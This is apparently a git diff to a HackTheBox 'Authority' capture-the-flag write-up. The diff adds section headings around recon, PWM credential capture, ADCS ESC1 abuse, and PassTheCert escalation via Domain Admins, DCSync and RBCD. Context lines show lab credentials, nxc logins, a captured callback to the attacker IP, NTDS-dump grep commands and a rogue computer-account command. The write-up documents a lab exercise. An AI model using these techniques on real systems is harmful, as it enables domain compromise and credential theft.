@@ -21,6 +21,8 @@ layout:
 
 ***
 
+## Reconnaissance
+
 
 
 ```bash
@@ -242,6 +244,8 @@ defaultNamingContext: DC=authority,DC=htb
 10.10.11.222 authority.htb AUTHORITY.authority.htb
 ```
 
+## Web Enumeration
+
 
 
 <figure><img src="../../.gitbook/assets/imagen (442).png" alt=""><figcaption></figcaption></figure>
@@ -286,6 +290,10 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 20s    30005/30005   0s      found:3       errors:0      
 [####################] - 19s    30002/30002   1555/s  http://10.10.11.222/  
 ```
+
+
+
+## SMB Enumeration
 
 
 
@@ -407,6 +415,12 @@ drwxr-xr-x root root 0 B Fri Mar 17 14:20:40 2023  Automation
 
 27 directories, 52 files
 ```
+
+
+
+## Initial Foothold
+
+### Cracking Ansible Vault Secrets with Hashcat
 
 Automation/Ansible/PWM/defaults
 
@@ -566,6 +580,12 @@ DevT3st@123
 
 
 
+## Initial Access
+
+### Accesing on PWM (Password Recovery Tool from LDAP)
+
+
+
 ```bash
 ❯ nxc smb 10.10.11.222 -u 'svc_pwm' -p 'pWm_@dm!N_!23'
 SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
@@ -581,6 +601,8 @@ SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pW
 <figure><img src="../../.gitbook/assets/5212_vmware_aEObt8usUd.png" alt=""><figcaption></figcaption></figure>
 
 
+
+### Abusing PWM to modify the LDAP URL to our IP to obtain the saved password
 
 
 
@@ -624,6 +646,8 @@ connect to [10.10.16.3] from (UNKNOWN) [10.10.11.222] 64084
 
 
 
+### Abusing WinRM - EvilWinRM
+
 
 
 ```bash
@@ -648,7 +672,11 @@ Info: Establishing connection to remote endpoint
 
 
 
+## Privilege Escalation&#x20;
 
+
+
+### DC Enumeration (adPEAS) - Powershell tool to automate Active Directory enumeration
 
 ```bash
 ❯ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
@@ -716,6 +744,10 @@ EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_
 [!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
 [+] Enrollment allowed for:		HTB\Domain Computers
 ```
+
+### Abusing Active Directory Certificate Services (ADCS)
+
+
 
 
 
@@ -803,6 +835,10 @@ Certificate Templates
     [!] Vulnerabilities
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
+
+
+
+### ESC1 exploitation case (Machine Account) with certipy-ad
 
 
 
@@ -930,6 +966,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 ```
 
+### Authenticating with certificates when PKINIT is not supported (PassTheCert.py)
+
 
 
 {% embed url="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" %}
@@ -976,6 +1014,10 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] You are logged in as: HTB\Administrator
 ```
+
+
+
+### Nº1 PrivEsc - Adding user to Domain Admins group trough PassTheCert Authentication
 
 
 
@@ -1062,7 +1104,7 @@ Info: Establishing connection to remote endpoint
 ecfaaf85b2859960b8313f78b73cd39e
 ```
 
-
+### Nº2 PrivEsc - Assigning DCSync permissions to a user through PassTheCert Authentication
 
 otra
 
@@ -1093,9 +1135,7 @@ SMB         10.10.11.222    445    AUTHORITY        [*] cat /home/kali/.nxc/logs
 SMB         10.10.11.222    445    AUTHORITY        [*] grep -iv disabled /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds | cut -d ':' -f1
 ```
 
-
-
-RBCD
+### Nº3 PrivEsc - Resource-based Constrained Delegation (RBCD Attack) trough PassTheCert Authentication
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action add_computer -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -computer-name 'rbcd_gzzcoo$' -computer-pass 'Gzzcoo123'
